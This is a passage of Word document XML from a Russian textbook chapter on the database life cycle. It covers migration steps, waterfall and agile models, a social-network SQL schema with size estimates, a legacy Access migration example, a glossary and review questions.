        <w:t>Импортировать в PostgreSQL: `psql &lt; data.sql`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Проверить, что всё работает</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Переключить приложение на PostgreSQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Оставить MySQL работать ещё месяц (на случай проблем)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Выключить MySQL, удалить</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1.3. Модели жизненного цикла</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Существуют разные подходы к организации жизненного цикла БД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Каскадная модель (Waterfall)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принцип:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Последовательное выполнение фаз. Завершил одну → переходишь к следующей. Назад не возвращаемся.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Анализ → Проектирование → Реализация → Тестирование → Эксплуатация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понятно и структурировано</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Легко планировать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подходит для крупных проектов с чёткими требованиями</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет гибкости (требования изменились → всё переделывать)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Долго (от идеи до результата — месяцы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ошибки выявляются поздно (на этапе тестирования)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Государственные проекты, банковские системы, крупные корпорации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Agile / Iterative модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принцип:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Итеративная разработка. Делаем небольшие части (спринты 2-4 недели), быстро тестируем, получаем обратную связь, дорабатываем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Спринт 1: Базовая схема (users, products) → Тестирование → Фидбэк</w:t>
        <w:br/>
        <w:t>Спринт 2: Заказы (orders, order_items) → Тестирование → Фидбэк</w:t>
        <w:br/>
        <w:t>Спринт 3: Оптимизация (индексы, репликация) → Тестирование → Фидбэк</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Гибкость (можем менять требования)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстрый результат (первая версия через 2 недели)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Раннее выявление проблем</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложнее планировать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требует хорошей коммуникации с заказчиком</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Может привести к хаотичной архитектуре (если нет контроля)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Стартапы, веб-приложения, SaaS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Сравнение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Параметр          | Waterfall                  | Agile                       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------------------|----------------------------|-----------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Гибкость          | Низкая                     | Высокая                     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Скорость запуска  | Медленная (месяцы)         | Быстрая (недели)            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Изменения         | Дорого, сложно             | Легко                       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Документация      | Подробная, формальная      | Минимальная, гибкая         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Применение        | Крупные корпоративные БД   | Стартапы, веб-приложения    |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1.4. Практические примеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 9: Проектирование БД для социальной сети</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Требования:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователи (регистрация, профиль)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Посты (текст, фото)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Лайки (пользователь лайкает пост)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Комментарии (к постам)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дружба (пользователи добавляют друг друга в друзья)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ER-диаграмма:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[User] ──(1)──────(N)── [Post]</w:t>
        <w:br/>
        <w:t xml:space="preserve">  │                       │</w:t>
        <w:br/>
        <w:t xml:space="preserve">  └── username,           └── content, created_at</w:t>
        <w:br/>
        <w:t xml:space="preserve">      email,</w:t>
        <w:br/>
        <w:t xml:space="preserve">      bio</w:t>
        <w:br/>
        <w:br/>
        <w:t>[User] ──(M)──────(N)── [Like] ──(N)──────(1)── [Post]</w:t>
        <w:br/>
        <w:br/>
        <w:t>[User] ──(1)──────(N)── [Comment] ──(N)──────(1)── [Post]</w:t>
        <w:br/>
        <w:br/>
        <w:t>[User] ──(M)──────(N)── [Friendship] (самосвязь: User → User)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логические таблицы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE users (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user_id SERIAL PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username VARCHAR(50) UNIQUE NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    email VARCHAR(255) UNIQUE NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password_hash VARCHAR(255) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    bio TEXT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>CREATE TABLE posts (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    post_id SERIAL PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user_id INT REFERENCES users(user_id) ON DELETE CASCADE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    content TEXT NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    image_url VARCHAR(255),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>CREATE TABLE likes (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    like_id SERIAL PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user_id INT REFERENCES users(user_id) ON DELETE CASCADE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    post_id INT REFERENCES posts(post_id) ON DELETE CASCADE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    UNIQUE(user_id, post_id)  -- один пользователь может лайкнуть пост только раз</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>CREATE TABLE comments (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    comment_id SERIAL PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user_id INT REFERENCES users(user_id) ON DELETE CASCADE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    post_id INT REFERENCES posts(post_id) ON DELETE CASCADE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    content TEXT NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>CREATE TABLE friendships (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    friendship_id SERIAL PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user1_id INT REFERENCES users(user_id) ON DELETE CASCADE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user2_id INT REFERENCES users(user_id) ON DELETE CASCADE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    CHECK (user1_id &lt; user2_id),  -- избегаем дубликатов (1→2 и 2→1)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    UNIQUE(user1_id, user2_id)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Индексы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE INDEX idx_posts_user ON posts(user_id);</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_likes_post ON likes(post_id);</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_comments_post ON comments(post_id);</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_friendships_users ON friendships(user1_id, user2_id);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оценка размера БД:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Предположим:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1 млн пользователей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый пользователь: 5 постов → 5 млн постов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый пост: 10 лайков → 50 млн лайков</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый пост: 3 комментария → 15 млн комментариев</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый пользователь: 100 друзей → 50 млн записей дружбы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расчёт размера таблицы `posts`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Одна запись: post_id (4 байта) + user_id (4) + content (средний размер 200 символов = 200 байт) + image_url (100 байт) + created_at (8 байт) = ~316 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5 млн постов: 5 000 000 × 316 = 1 580 000 000 байт ≈ 1.5 ГБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итоговый размер БД:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ~10-20 ГБ (с учётом индексов и служебных данных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Для 1 млн пользователей достаточно одного сервера. При росте до 10 млн — нужна репликация.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 10: Миграция legacy-системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ситуация:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Компания 20 лет вела учёт в Microsoft Access (БД на 500 МБ). Решили мигрировать на PostgreSQL.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Access использует нестандартные типы данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Много дубликатов (клиенты записаны по 10 раз)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отсутствуют первичные ключи (!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Неправильная кодировка (кириллица превратилась в кракозябры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>План миграции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Экспортировать Access → CSV</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Написать скрипт очистки (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Удалить дубликаты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Исправить кодировку</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Добавить первичные ключи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Спроектировать нормализованную схему PostgreSQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Импортировать данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Проверить целостность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Перевести приложение на новую БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сроки:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 3 месяца (большую часть времени — очистка данных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стоимость:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 2 миллиона рублей (работа аналитиков, программистов, тестировщиков).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Миграция legacy-систем — это ад. Но без этого компания не сможет расти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1.5. Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.1** (Инфологическое моделирование): концептуальное проектирование БД = построение ER-диаграмм</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.2** (Понятие база данных, архитектура БД): жизненный цикл БД включает выбор архитектуры</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.3** (Реляционные БД, нормализация): логическое проектирование требует знания нормальных форм</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.2** (Информационные модели): моделирование предметной области = часть анализа требований</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9** (Информационная безопасность): на этапе эксплуатации критична защита данных (шифрование, бэкапы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жизненный цикл БД (DBLC)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — последовательность этапов от создания до вывода из эксплуатации базы данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Анализ требований</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сбор информации о том, какие данные нужно хранить и как с ними работать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Концептуальное проектирование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — создание ER-диаграммы (сущности и связи) без привязки к конкретной СУБД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логическое проектирование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — преобразование ER-диаграммы в таблицы реляционной модели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Физическое проектирование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — оптимизация схемы БД под конкретную СУБД (индексы, партиции).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Первичный ключ (Primary Key)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — уникальный идентификатор строки в таблице.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Внешний ключ (Foreign Key)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — поле, ссылающееся на первичный ключ другой таблицы (обеспечивает целостность).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Индекс (Index)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — структура данных для ускорения поиска.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Репликация (Replication)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — копирование данных с одного сервера на другие (для отказоустойчивости и масштабируемости).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шардирование (Sharding)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — разделение данных между несколькими серверами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Миграция (Migration)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — изменение схемы БД или перенос данных из одной системы в другую.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нормализация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс организации таблиц для устранения избыточности (подробнее в главе 7.3).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>СУБД (DBMS)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — система управления базами данных (PostgreSQL, MySQL, Oracle и т.д.).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Бэкап (Backup)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — резервная копия БД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Перечислите 8 фаз жизненного цикла базы данных. Объясните, почему нельзя пропустить фазу проектирования и сразу начать реализацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Интернет-магазин имеет таблицы: `users` (100 тыс. записей), `products` (10 тыс.), `orders` (1 млн). Запрос "найти все заказы пользователя с email = 'user@example.com'" выполняется 5 секунд. Какие индексы нужно создать, чтобы ускорить запрос? Обоснуйте.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Проектирование:** Спроектируйте логическую схему БД для библиотеки: книги, авторы, читатели, выдача книг. Определите первичные и внешние ключи. Какие связи между таблицами (1:N, M:N)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сравнение:** В чём разница между вертикальным и горизонтальным масштабированием БД? Приведите пример ситуации, когда вертикальное масштабирование не поможет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
